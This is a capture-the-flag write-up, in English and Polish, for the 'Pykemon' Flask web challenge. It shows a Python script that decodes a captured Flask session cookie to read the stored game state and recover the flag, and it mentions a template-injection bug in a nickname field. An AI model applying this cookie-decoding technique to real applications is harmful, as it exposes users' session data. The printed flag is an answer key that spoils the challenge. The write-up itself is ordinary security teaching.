# Pykemon (web, 151p)

## ENG
[PL](#pl-version)

We get access to a simple [Python Flask webapp](pykemon.zip).
The application displays on the screen some pokemon and a flag among them.
We can click on them to "catch".

By looking in the source code of the application we can see that it's actually impossible to catch a flag, since it's "rarity" has value 0.
We instantly noticed that the cookie for this page was really big, and was changing with the state of the game changes.
This suggested to us that the game state might be stored there.
Checking in the source code proved this is true.

More importantly this meant also the pokemon "descriptions" were there, including the flag!
It actually turned out to be an unintended solution to the task, because the author did not know that decoding Flask cookie is trivial.
The inteded solution was a template injection in the pokemon nickname.
We noticed that there was some vulnerability there, which we initially considered some stored XSS at most, but since we found the cookie, we went this way.

So we basically take the cookie, decode it and read the flag value from the game state:

```python
import base64
import zlib
from flask import json
from itsdangerous import base64_decode, base64_encode


def decode(cookie):
    compressed = False
    payload = cookie
    if payload.startswith('.'):
        compressed = True
        payload = payload[1:]
    data = payload.split(".")[0]
    data = base64_decode(data)
    if compressed:
        data = zlib.decompress(data)
    return data.decode("utf-8")


def main():
    session = ".eJy9V11zojAU_Ss7PPsAUdriTB82bQE7lY648pGdzg4kLFECMiJFdPrf96L9sFbbfdC-kXvzdc49OQkrKQyEKKSuIrckGpQxn0vdlZTXSZROM6n7--GpJc2m0_R9dCWxqKCzcT4fN-2V9COUutLIFDJDF3Hg9WN_iAeRO-ehq5U9w6qJq8vEHcR-lsQEOSXx7Nyv8dx31ZyaTuFDO0SdSwnW47nUVdWWlAVptDv5ukM2psnBZD5mu3HFGlyuc7NgNp7XG7RFDt9vUwSuwmFjy7s2VpnJHu8yXJKqGfbUOj3cDjoiXLkfnwLujTWys_l937T_Wrq2DK71MnI0yzLoIljaNTXlVzhteQeOnSywXV3uh7Od3Iazji_71TaUT5AgUvguLamhZt9TtLOLIxYN3f88QdEcxEU4xnJgiGVPx2qA9DlAiCkSJWn3i54h5J6hCpY6dc_EnHmWoDWWwxqPaepwZnBx96ymNWTlI-SMoEXDT0riAwXe12mHgrf8xF9s06B-TgNBrAg8rJDU_4_KQwV5r6HCsAAqVLPtwLcoe6Y9JUMsItMGFSjibox1oATibBq4C7GhqRmnL0PDEfSqAgWBUpBW0rbNw8wuoiGGnVigIBX63ao9Q3lkKdBc45yZ_RjUVQO1nKaaEqaD8oVStM_pmo0eVNFLcldFTbw_Gb1TkfaFigxd9odqFab0G1Wk7jk4x1bRqHMSFR2bivOz01NB0ckO1NGu-_OjXvfVKazU4DlUcgsm59AW4AcTZt7mPhJyNFSWzNDqwFUzqP4jc60pAXoahQSe3fjOlLjOjNadGOYTFI1i38NV4w3gQY_gGwI8Zd540du8ehGaCXgNrJcyQa5wwrzbHI5s3KgJ1JYTxOVXr9qochKYI1DlQhAPL7cVp-2heubDRtngsNreddihfJP7lbS3Ke98TvnzBr9RYRfaERXWuT_RgzIBxcw2N81NHLlOERpae9tnoOKcXeGagK-E7m1BNtQ8j9NqUFBODSfx3SqmxoIzU1TM67_R0PlIw3rwIRpekzs0rOP314N3NJx94S2mMwnq19vmofXyS_GHTssM_jwUeAbPmnXkp6d__PP4oA.C90P4g.yJA29lcU7LN3k40oLYnA6cN9r8M"
    session_decoded = decode(session)
    print(session_decoded)
    loaded = json.loads(session_decoded)
    room = loaded['room']
    pykemons = room['pykemon']
    for pykemon in pykemons:
        desc = pykemon['description']
        print(base64.b64decode(desc.items()[0][1]))

main()
```

And we find: `PCTF{N0t_4_sh1ny_M4g1k4rp}`

## PL version

Dostajemy dostęp do prostej [Pythonowej aplikacji we Flasku](pykemon.zip).
Aplikacja wyświetla na ekranie pokemony oraz flagę.
Możemy klikać na nie żeby je "złapać".

Z kodu źródłowego wynika, że nie da się złapać flagi ponieważ ma "rarity" ustawione na 0.
Szybko zauważyliśmy, że cookie na tej stronie było bardzo duże i zmieniało się wraz ze zmiane stanu gry.
To sugerowało że stan gry może być tam przechowywany.
Sprawdzenie kodu źródłowego dowodziło że faktycznie tak jest.

Co więcej znajduje się tam tez pole "description" które zawiera flagę!
Okazało się później, że ta metoda była zupełnie niezamierzona i autor zadania nie wiedział ze cookie Flaska łatwo zdekodować.
Oczekiwane rozwiązanie polegało na template injection w nickname pokemona.
Zauważliśmy też podatność w nickname, chociaż początkowo uznaliśmy ją za stored XSS, ale widząc cookie uznaliśmy, że pójdziemy w tym kierunku.

Zdekodowaliśmy więc cookie ze stanem gry:

```python
import base64
import zlib
from flask import json
from itsdangerous import base64_decode, base64_encode


def decode(cookie):
    compressed = False
    payload = cookie
    if payload.startswith('.'):
        compressed = True
        payload = payload[1:]
    data = payload.split(".")[0]
    data = base64_decode(data)
    if compressed:
        data = zlib.decompress(data)
    return data.decode("utf-8")


def main():
    session = ".eJy9V11zojAU_Ss7PPsAUdriTB82bQE7lY648pGdzg4kLFECMiJFdPrf96L9sFbbfdC-kXvzdc49OQkrKQyEKKSuIrckGpQxn0vdlZTXSZROM6n7--GpJc2m0_R9dCWxqKCzcT4fN-2V9COUutLIFDJDF3Hg9WN_iAeRO-ehq5U9w6qJq8vEHcR-lsQEOSXx7Nyv8dx31ZyaTuFDO0SdSwnW47nUVdWWlAVptDv5ukM2psnBZD5mu3HFGlyuc7NgNp7XG7RFDt9vUwSuwmFjy7s2VpnJHu8yXJKqGfbUOj3cDjoiXLkfnwLujTWys_l937T_Wrq2DK71MnI0yzLoIljaNTXlVzhteQeOnSywXV3uh7Od3Iazji_71TaUT5AgUvguLamhZt9TtLOLIxYN3f88QdEcxEU4xnJgiGVPx2qA9DlAiCkSJWn3i54h5J6hCpY6dc_EnHmWoDWWwxqPaepwZnBx96ymNWTlI-SMoEXDT0riAwXe12mHgrf8xF9s06B-TgNBrAg8rJDU_4_KQwV5r6HCsAAqVLPtwLcoe6Y9JUMsItMGFSjibox1oATibBq4C7GhqRmnL0PDEfSqAgWBUpBW0rbNw8wuoiGGnVigIBX63ao9Q3lkKdBc45yZ_RjUVQO1nKaaEqaD8oVStM_pmo0eVNFLcldFTbw_Gb1TkfaFigxd9odqFab0G1Wk7jk4x1bRqHMSFR2bivOz01NB0ckO1NGu-_OjXvfVKazU4DlUcgsm59AW4AcTZt7mPhJyNFSWzNDqwFUzqP4jc60pAXoahQSe3fjOlLjOjNadGOYTFI1i38NV4w3gQY_gGwI8Zd540du8ehGaCXgNrJcyQa5wwrzbHI5s3KgJ1JYTxOVXr9qochKYI1DlQhAPL7cVp-2heubDRtngsNreddihfJP7lbS3Ke98TvnzBr9RYRfaERXWuT_RgzIBxcw2N81NHLlOERpae9tnoOKcXeGagK-E7m1BNtQ8j9NqUFBODSfx3SqmxoIzU1TM67_R0PlIw3rwIRpekzs0rOP314N3NJx94S2mMwnq19vmofXyS_GHTssM_jwUeAbPmnXkp6d__PP4oA.C90P4g.yJA29lcU7LN3k40oLYnA6cN9r8M"
    session_decoded = decode(session)
    print(session_decoded)
    loaded = json.loads(session_decoded)
    room = loaded['room']
    pykemons = room['pykemon']
    for pykemon in pykemons:
        desc = pykemon['description']
        print(base64.b64decode(desc.items()[0][1]))

main()
```

A tam znaleźliśmy: `PCTF{N0t_4_sh1ny_M4g1k4rp}`
